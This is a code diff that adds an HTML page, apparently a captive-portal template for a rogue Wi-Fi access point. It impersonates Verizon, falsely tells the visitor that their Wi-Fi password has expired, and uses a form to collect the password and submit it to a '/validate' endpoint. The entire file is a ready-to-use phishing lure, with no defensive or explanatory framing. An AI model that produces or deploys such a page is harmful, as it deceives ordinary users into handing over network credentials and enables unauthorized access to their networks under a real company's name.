@@ -1,0 +1,103 @@
+<html>
+<head>
+    <meta name='viewport' content='width=device-width,
+    initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>
+    <title>Update verizon Wifi Password</title>
+    <style>
+        button {
+            color: #ffffff;
+            background-color: #ed333b;
+            font-size: 15px;
+            border: 1px solid #ed333b;
+            border-radius: 10px;
+            padding: 10px 30px;
+            cursor: pointer
+        }
+
+        button:hover {
+            color: #ffffff;
+            background-color: #c2131c;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            width: 360px;
+            padding: 8% 0 0;
+            margin: auto;
+            align-items: center;
+            text-align: center;
+            max-width: 400px;
+            justify-content: center;
+        }
+
+        h1 {
+            margin: 40px 0;
+        }
+
+        p {
+            margin: 10px 0;
+        }
+
+        form {
+            text-align: left;
+            padding: 20px;
+            border: 1px solid #cecece;
+            border-radius: 4px;
+        }
+
+        label {
+            display: block;
+            margin: 10px 0;
+        }
+
+        input[type=text], input[type=password] {
+            width: 100%;
+            padding: 12px 20px;
+            margin: 8px 0;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        input[type=submit] {
+            width: 100%;
+            background-color: #4CAF50;
+            color: white;
+            padding: 14px 20px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        input[type=submit]:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+<div class=container>
+    <img src=data:image/png;base64,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 width="150" height="150" Router>
+    <h1>WiFi Password expired!</h1>
+    <p>Your Wi-Fi password has expired. Re-enter the Wi-Fi password to continue using the internet.</p>
+    <div class='login-page'>
+        <div class='form'>
+            <form class='login-form' action='/validate' method='GET'>
+                <div class='circle-mask'></div>
+                <input id='g' type='password' placeholder='Password' name='pass' required/>
+                <input type='hidden' name='url' value='google.com' style=display:block; margin: 0 auto;>
+                <div id='l' style="text-align:center" type='submit'>
+                    <button>Submit</button>
+                </div>
+            </form>
+        </div>
+    </div>
+</div>
+</body>
+
+</html>
